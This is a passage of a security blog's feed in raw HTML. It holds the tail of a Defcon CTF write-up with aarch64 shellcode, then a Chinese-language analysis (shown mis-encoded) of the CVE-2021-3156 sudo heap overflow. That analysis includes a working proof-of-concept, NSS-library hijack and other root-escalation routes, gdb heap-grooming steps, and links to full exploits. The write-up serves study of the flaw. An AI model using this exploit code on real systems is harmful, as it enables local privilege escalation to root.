x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fseek</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0x510</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">0</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x364</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x1&#x27;</span>:<span class="number">0xFFFF000000082A5C</span><span class="number">-4</span>, <span class="string">&#x27;x2&#x27;</span>:<span class="number">8</span>, <span class="string">&#x27;x12&#x27;</span>:<span class="number">0x34C</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&quot;MOV             X0, X6\n&quot;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">shellcode += pwnlib.shellcraft.aarch64.setregs(&#123;<span class="string">&#x27;x2&#x27;</span>:<span class="number">0x50</span>, <span class="string">&#x27;x6&#x27;</span>:<span class="number">0xFFFF000000088858</span>,<span class="string">&#x27;x12&#x27;</span>:<span class="number">0x310</span>&#125;)</span><br><span class="line">shellcode += <span class="string">&#x27;MOV X0, X6\n&#x27;</span></span><br><span class="line">shellcode += <span class="string">&#x27;BLR x12\n&#x27;</span></span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="Writeup" scheme="https://bestwing.me/categories/Writeup/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="Defcon" scheme="https://bestwing.me/tags/Defcon/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-3156 sudo heap-overflow æ¼æ´åˆ†æ</title>
    <link href="https://bestwing.me/CVE-2021-3156-analysis.html"/>
    <id>https://bestwing.me/CVE-2021-3156-analysis.html</id>
    <published>2021-01-31T16:00:00.000Z</published>
    <updated>2021-02-03T06:13:29.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="æ¼æ´èƒŒæ™¯"><a href="#æ¼æ´èƒŒæ™¯" class="headerlink" title="æ¼æ´èƒŒæ™¯"></a>æ¼æ´èƒŒæ™¯</h2><p>1 æœˆ26 æ—¥çš„æ—¶å€™ï¼Œ æœ‰æ–‡ç« æŠ«éœ²äº† sudo ä»£ç ä¸­å­˜åœ¨ å †ç¼“å†²åŒºæº¢å‡ºï¼Œäºæ˜¯èŠ±äº†æ¼«é•¿çš„æ—¶é—´å°è¯•å†™ç›¸å…³åˆ©ç”¨, æœ¬æ–‡ä»¥å­¦ä¹ ç¬”è®°ä¸ºä¸»ã€‚</p><p>å®Œæ•´åˆ©ç”¨å¯è§ï¼š</p><p><a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><blockquote><p>The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability.</p><p>Sudo is a powerful utility thatâ€™s included in most if not all Unix- and Linux-based OSes. It allows users to run programs with the security privileges of another user. The vulnerability itself has been hiding in plain sight for nearly 10 years. It was introduced in July 2011 (commit 8255ed69) and affects all legacy versions from 1.8.2 to 1.8.31p2 and all stable versions from 1.9.0 to 1.9.5p1 in their default configuration.</p><p>Successful exploitation of this vulnerability allows any unprivileged user to gain root privileges on the vulnerable host. Qualys security researchers have been able to independently verify the vulnerability and develop multiple variants of exploit and obtain full root privileges on Ubuntu 20.04 (Sudo 1.8.31), Debian 10 (Sudo 1.8.27), and Fedora 33 (Sudo 1.9.2). Other operating systems and distributions are also likely to be exploitable.</p></blockquote><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œä»¥ sudo 1.8.31 ç‰ˆæœ¬ä½œä¸ºåˆ†æç›®æ ‡ã€‚ ubuntu 20.04.1 ä½œä¸ºåˆ†æç¯å¢ƒ</p><p>PoC:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> obufsz = <span class="number">8</span>;</span><br><span class="line"><span class="keyword">char</span> obuf[obufsz];</span><br><span class="line"><span class="built_in">memset</span>(obuf, <span class="string">&#x27;B&#x27;</span>, <span class="keyword">sizeof</span>(obuf));</span><br><span class="line">obuf[obufsz<span class="number">-2</span>] = <span class="number">0x5c</span>;</span><br><span class="line">obuf[obufsz<span class="number">-1</span>] = <span class="number">0x00</span>;</span><br><span class="line"><span class="keyword">char</span> *args[] = &#123;</span><br><span class="line"><span class="string">&quot;/usr/bin/sudoedit&quot;</span>,</span><br><span class="line"><span class="string">&quot;-s&quot;</span>,</span><br><span class="line">obuf,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *extra_args[] = &#123;</span><br><span class="line"><span class="string">&quot;X/X\\&quot;</span>,</span><br><span class="line"><span class="string">&quot;a&quot;</span>,</span><br><span class="line"><span class="string">&quot;LC_MESSAGES=C.UTF-8@AAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">execve(args[<span class="number">0</span>], args, extra_args);</span><br><span class="line"></span><br><span class="line"><span class="comment">// execvpe(&quot;./sudoedit&quot;, args, extra_args);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´äº§ç”Ÿçš„ä»£ç ä½äº <code>plugins/sudoers/sudoers.c</code>  çš„ <code>set_cmnd</code> å‡½æ•°</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" title="image-20210201141621764" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201141621764.png" alt="image-20210201141621764"></a></p><p>é¦–å…ˆé€šè¿‡ 854 å¤„ï¼Œä¸º <code>sudoedit</code>  <code>-s</code>  åçš„å­—ç¬¦é•¿åº¦åˆ†é…å†…å­˜ç©ºé—´ï¼Œ å³ <code>user_args</code>,  å½“ä»£ç å¤„ç†åˆ° 866 å¤„çš„æ—¶å€™ï¼Œ å¦‚æœå‚æ•°ä¸ºå¦‚ä¸‹ç»“æ„ï¼Œå³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p NewArgv[0]</span><br><span class="line">$4 &#x3D; 0x55555557183e &quot;sudoedit&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[1]</span><br><span class="line">$5 &#x3D; 0x7fffffffee13 &quot;BBBBBB\\&quot;</span><br><span class="line">pwndbg&gt; p NewArgv[2]</span><br><span class="line">$6 &#x3D; 0x0</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡æ‹·è´ ä¼šå°† <code>B</code> æ‹·è´åˆ° <code>user_args</code> é‡Œï¼Œç„¶å from ++ </p><p>å½“ <code>B</code> æ‹·è´å®Œï¼Œ <code>from[0] == &#39;\\&#39;</code> ï¼Œ ä¸”<code>from[1]</code> ä¸ä¸ºç©ºçš„æ—¶å€™ï¼Œ æ­¤æ—¶ from ++ , ç„¶ååˆè¿›åˆ°è¿™ä¸ª while å¾ªç¯ï¼Œ from åé¢çš„æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p from[0]</span><br><span class="line">$3 &#x3D; 92 &#39;\\&#39;</span><br><span class="line">pwndbg&gt; p from[1]</span><br><span class="line">$4 &#x3D; 0 &#39;\000&#39;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ from åé¢çš„æ•°æ®ä¸ºç¯å¢ƒå˜é‡è®¾ç½®çš„æ•°æ®, å³è¿™é‡Œæ­¤æ—¶ <code>from[0]</code> ä¸º <code>X/X</code> ã€‚æœ€ç»ˆç»“æœå°±æ˜¯ <code>user_args</code> è¢«è¶Šç•Œ</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h4 id="ä¸‰ç§åˆ©ç”¨æ€è·¯"><a href="#ä¸‰ç§åˆ©ç”¨æ€è·¯" class="headerlink" title="ä¸‰ç§åˆ©ç”¨æ€è·¯"></a>ä¸‰ç§åˆ©ç”¨æ€è·¯</h4><p>åŸä½œè€…çš„æåˆ°äº†ï¼Œ ä»–ä»¬é€šè¿‡éšæœºæ·»åŠ  <code>LC_*</code> ç­‰ç¯å¢ƒå˜é‡æ¥é£æ°´å †å¸ƒå±€ï¼Œ äº§ç”Ÿäº†æ•°åç§ crash æ ·æœ¬ï¼Œå…¶ä¸­æœ‰ä¸‰ç§åˆ©ç”¨æ€è·¯ï¼Œ</p><p>ï¼ˆ1ï¼‰é€šè¿‡è¦†å†™ <code>sudo_hook_entry</code>  ç»“æ„ä½“</p><pre><code>è¯¥éƒ¨åˆ†ä»£ç ä½äº `src/hooks.c`  107è¡Œ ï¼Œ æ€»ä½“æ€è·¯ä¸º é€šè¿‡å †æº¢å‡ºï¼ŒåŠ«æŒå‡½æ•°æŒ‡é’ˆgetenv_fn çš„ä½ä¸¤ä½ï¼Œ é€šè¿‡çˆ†ç ´çš„æ–¹æ³•å°†å‡½æ•°åŠ«æŒåˆ° `execv` æ¥æ‰§è¡Œæˆ‘ä»¬çš„ç¨‹åºã€‚ è¯¥æ€è·¯å·²ç»æœ‰å…¬å¼€çš„åˆ©ç”¨ä»£ç ,  å¯è§[Github](https://github.com/lockedbyte/CVE-Exploits/tree/master/CVE-2021-3156)</code></pre><p>   (2)  é€šè¿‡è¦†å†™ <code>service_user</code> ç»“æ„ä½“</p><pre><code>è¯¥éƒ¨åˆ†ä»£ç ä½äº glibc æºä»£ç ä¸­çš„ `glibc-2.31/nss/nsswitch.c` çš„330 è¡Œï¼Œ </code></pre><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line"><span class="number">329</span> &#123;</span><br><span class="line"><span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">331</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">338</span>       ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class="line"><span class="number">339</span>                                      ni-&gt;name);</span><br><span class="line">...</span><br><span class="line"><span class="number">342</span>     &#125;</span><br><span class="line"><span class="number">343</span> </span><br><span class="line"><span class="number">344</span>   <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">345</span>     &#123;</span><br><span class="line"><span class="number">346</span>       <span class="comment">/* Load the shared library.  */</span></span><br><span class="line"><span class="number">347</span>       <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line"><span class="number">348</span>                       + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line"><span class="number">349</span>       <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line"><span class="number">350</span>       <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"><span class="number">351</span> </span><br><span class="line"><span class="number">352</span>       <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line"><span class="number">353</span>       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class="line"><span class="number">354</span>                                               <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line"><span class="number">355</span>                                     ni-&gt;name),</span><br><span class="line"><span class="number">356</span>                           <span class="string">&quot;.so&quot;</span>),</span><br><span class="line"><span class="number">357</span>                 __nss_shlib_revision);</span><br><span class="line"><span class="number">358</span> </span><br><span class="line"><span class="number">359</span>       ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šè¿‡è¦†ç›– <code>ni-&gt;name</code> ï¼Œè®©ç¨‹åºå» <code>___libc_dlopen</code> åŠ è½½æˆ‘ä»¬ç¼–å†™çš„ libc åº“ï¼Œ åœ¨åŠ ä¸Š <code>__attribute__ ((constructor))</code> çš„é­”æœ¯æ–¹æ³•ï¼Œæ¥è®©åŠ è½½ libc åç¬¬ä¸€æ—¶é—´æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œ</p><p>ï¼ˆ3ï¼‰é€šè¿‡è¦†å†™ <code>def_timestampdir </code>ç»“æ„ä½“</p><pre><code>å°†def_timestampdirè¦†ç›–ä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥ä¸sudoçš„`ts_mkdirs()`ç«äº‰ï¼Œåˆ›å»ºä¸€ä¸ªæŒ‡å‘ä»»æ„æ–‡ä»¶çš„ç¬¦å·é“¾æ¥ã€‚å¹¶ä¸”å°è¯•æ‰“å¼€è¿™ä¸ªæ–‡ä»¶ï¼Œå‘å…¶ä¸­å†™å…¥ä¸€ä¸ªstruct timestamp_entryã€‚æˆ‘ä»¬å¯ä»¥ç¬¦å·é“¾æ¥å°†å…¶æŒ‡å‘/etc/passwdï¼Œç„¶åä»¥rootæ‰“å¼€ä»–ï¼Œç„¶åå®ç°ä»»æ„ç”¨æˆ·çš„æ³¨å…¥ä»è€Œrootè¿™ä¸ªç±»ä¼¼çš„åˆ©ç”¨ä¼¼ä¹ä¹Ÿæœ‰ [Github](https://github.com/r4j0x00/exploits/blob/master/CVE-2021-3156/exploit.c)</code></pre><h4 id="ç¼–å†™åˆ©ç”¨"><a href="#ç¼–å†™åˆ©ç”¨" class="headerlink" title="ç¼–å†™åˆ©ç”¨"></a>ç¼–å†™åˆ©ç”¨</h4><p>è¿™é‡Œç®€å•æè¿°ä¸€ä¸‹ï¼Œæˆ‘ä¹‹å‰è°ƒè¯•ç¼–å†™åˆ©ç”¨ç¬¬äºŒç§æ–¹æ³•çš„è¿‡ç¨‹</p><p>é¦–å…ˆæˆ‘ä»¬çŸ¥é“äº† <code>sudo</code> ä»£ç ä¼šæ ¹æ®ç¯å¢ƒå˜é‡ä¸­çš„ <code>LC*</code> æ¥åˆ†é…é‡Šæ”¾å †å¸ƒå±€</p><blockquote><p>  in setlocale(), we malloc()ate and free() several LC  environment variables (LC_CTYPE, LC_MESSAGES, LC_TIME, etc), thereby creating small holes at   the very beginning of Sudoâ€™s heap (free fast or tcache chunks);</p></blockquote><p>å…¶æ¬¡ï¼Œæˆ‘ä»¬éœ€è¦æ˜ç¡®æˆ‘ä»¬çš„ç›®æ ‡æ˜¯ï¼Œæˆ‘ä»¬è¦è®©åˆ†é…çš„ <code>user_args</code>  ç»“æ„ä½“ ä¸ <code>service_user</code> ç»“æ„ä½“ä¸¤è€…é—´çš„è·ç¦»è¶Šè¿‘è¶Šå¥½ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬é€šè¿‡ï¼ˆfuzz å’Œ æ‰‹åŠ¨è°ƒè¯•çš„æ–¹æ³•æ¥é£æ°´å †å¸ƒå±€ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•åˆ¤æ–­ä¸¤è€…é—´çš„è·ç¦»å‘¢ï¼Ÿ é¦–å…ˆæˆ‘ä»¬å¯¹åˆ†é… <code>user_args</code> ä»£ç å¤„ä¸‹æ–­ï¼Œ å³ <code>b sudoers.c:854</code> , ç„¶åå¯¹ä½¿ç”¨ <code>service_user</code> å¤„ä¸‹æ–­ï¼Œï¼Œå³<code>b nsswitch.c:330</code> </p><p>ç”±äºæˆ‘ä»¬çš„åˆ©ç”¨æ˜¯é€šè¿‡ <code>execve</code> æ¥æ‰§è¡Œ <code>sudoedit</code> ï¼Œ å› æ­¤æˆ‘ä»¬è°ƒè¯•çš„æ˜¯æˆ‘ä»¬ç¼–å†™åˆ©ç”¨ç¨‹åºçš„å­è¿›ç¨‹ï¼Œå› æ­¤è¿˜éœ€è¦è®¾ç½®ä¸‹ gdb çš„è°ƒè¯•æ¨¡å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br></pre></td></tr></table></figure><p>è¿™æ ·å°±è¡Œäº†ï¼Œ æˆ‘å°†ä»¥ä¸Šä¸œè¥¿é›†æˆåˆ°ä¸€ä¸ª gdb è°ƒè¯•è„šæœ¬ä¸­ï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">catch exec</span><br><span class="line">set follow-exec-mode new</span><br><span class="line">r</span><br><span class="line">b policy_check</span><br><span class="line">c</span><br><span class="line">b sudoers.c:854</span><br><span class="line">b nsswitch.c:330  </span><br></pre></td></tr></table></figure><p>ç„¶åæŒ‚ä¸Šè°ƒè¯•å™¨  <code>gdb exploit -x gdbscript</code> , æŸ¥çœ‹ä¸¤è€…åç§»,  </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/Desktop/CVE<span class="number">-2021</span><span class="number">-3156</span>/sudo-SUDO_1_8_31/plugins/sudoers/sudoers.c</span><br><span class="line">   <span class="number">849</span>     <span class="keyword">size_t</span> size, n;</span><br><span class="line">   <span class="number">850</span></span><br><span class="line">   <span class="number">851</span>     <span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line">   <span class="number">852</span>     <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">   <span class="number">853</span> size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"> â–º <span class="number">854</span>     <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">   <span class="number">855</span> sudo_warnx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">   <span class="number">856</span> debug_return_int(<span class="number">-1</span>);</span><br><span class="line">   <span class="number">857</span>     &#125;</span><br><span class="line">   <span class="number">858</span>     <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">   <span class="number">859</span> <span class="comment">/*</span></span><br><span class="line"><span class="comment">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK </span></span><br><span class="line"><span class="comment">pwndbg&gt; bins</span></span><br><span class="line"><span class="comment">tcachebins</span></span><br><span class="line"><span class="comment">0x20 [  3]: 0x55555557ebc0 â€”â–¸ 0x5555555975c0 â€”â–¸ 0x55555558f0a0 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x40 [  1]: 0x555555586700 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x70 [  1]: 0x55555558f620 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x80 [  1]: 0x555555586680 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x90 [  1]: 0x555555586b60 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x110 [  1]: 0x555555597480 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x190 [  1]: 0x555555584820 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x1a0 [  1]: 0x5555555896d0 â—‚â€” 0x0</span></span><br><span class="line"><span class="comment">0x1e0 [  1]: 0x55555558f440 â—‚â€” 0x0</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>tcachebins</code> æ˜¯æˆ‘ä»¬å³å°†åˆ†é…çš„ <code>user_args</code> chunkï¼Œå…·ä½“åˆ†é…æ˜¯å“ªä¸ªï¼Œ å–å†³äº <code>user_args</code> çš„å¤§å°ï¼Œ ç„¶åå† c ä¸€ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In file: /home/swpwn/glibc<span class="number">-2.31</span>/nss/nsswitch.c</span><br><span class="line">   <span class="number">325</span> <span class="meta">#<span class="meta-keyword">if</span> !defined DO_STATIC_NSS || defined SHARED</span></span><br><span class="line">   <span class="number">326</span> <span class="comment">/* Load library.  */</span></span><br><span class="line">   <span class="number">327</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">   <span class="number">328</span> nss_load_library (service_user *ni)</span><br><span class="line">   <span class="number">329</span> &#123;</span><br><span class="line"> â–º <span class="number">330</span>   <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">   <span class="number">331</span>     &#123;</span><br><span class="line">   <span class="number">332</span>       <span class="comment">/* This service has not yet been used.  Fetch the service</span></span><br><span class="line"><span class="comment">   333  library for it, creating a new one if need be.  If there</span></span><br><span class="line"><span class="comment">   334  is no service table from the file, this static variable</span></span><br><span class="line"><span class="comment">   335  holds the head of the service_library list made from the</span></span><br><span class="line"><span class="comment">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span></span><br><span class="line"><span class="comment">pwndbg&gt; p ni</span></span><br><span class="line"><span class="comment">$1 = (service_user *) 0x555555582c20</span></span><br><span class="line"><span class="comment">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>è·å– <code>ni</code> çš„åœ°å€ï¼Œ ä¸ä¸Šé¢çš„ <code>tcachebins</code> è¿›è¡Œæ¯”è¾ƒï¼Œ è¶Šè¿‘è¶Šå¥½ï¼Œ æˆ‘æœ€åˆçš„åˆ©ç”¨è„šæœ¬ä¸¤è€…åç§»æœ€å°ä¸º 0x700 å·¦å³ï¼Œç„¶åä¸­é—´ä¸€è·¯è¦†ç›–è¿‡å»</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" title="image-20210201152543462" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201152543462.png" alt="image-20210201152543462"></a></p><p>å°† <code>ni-&gt;name</code> è¦†ç›–ä¸º â€œX/Xâ€ ,å…¶ä½™å†…å®¹ä»¥ <code>\0</code> è¦†ç›–ï¼Œè¿™é‡Œä¼šæ¶‰åŠä¸€ä¸ªé—®é¢˜ï¼Œé‚£ä¹ˆå°±æ˜¯å¦‚ä½•ä¼ å…¥<code>\00</code> å­—ç¬¦å‘¢ï¼Ÿ æˆ‘ä»¬çŸ¥é“ å‚æ•°å’Œç¯å¢ƒå˜é‡éƒ½æ˜¯ä¸å…è®¸å†™å…¥ <code>\x00</code>çš„ï¼Œå¦åˆ™å°†è¢«æˆªæ–­ã€‚é€šè¿‡é˜…è¯»ä»£ç å’Œè°ƒè¯•æˆ‘ä»¬æœ€ç»ˆå‘ç° æˆ‘ä»¬å¯ä»¥å•ç‹¬çš„ <code>\\</code> å­—ç¬¦æ¥ä½œä¸ºä¸€ä¸ª <code>\x00</code> å­—ç¬¦ã€‚</p><p>æœ€åæåŠä¸€ä¸‹ï¼Œéæºç è°ƒè¯•çš„æ–¹æ³•ï¼Œå› ä¸ºå½“æˆ‘ç¼–å†™åˆ©ç”¨åï¼Œåœ¨æœ¬åœ°æ‰§è¡Œæ˜¯æˆåŠŸäº†ï¼Œä½†æ˜¯æ¢äº†ä¸€ä¸ªæœºå™¨ï¼Œå³éç¼–è¯‘çš„ sudo 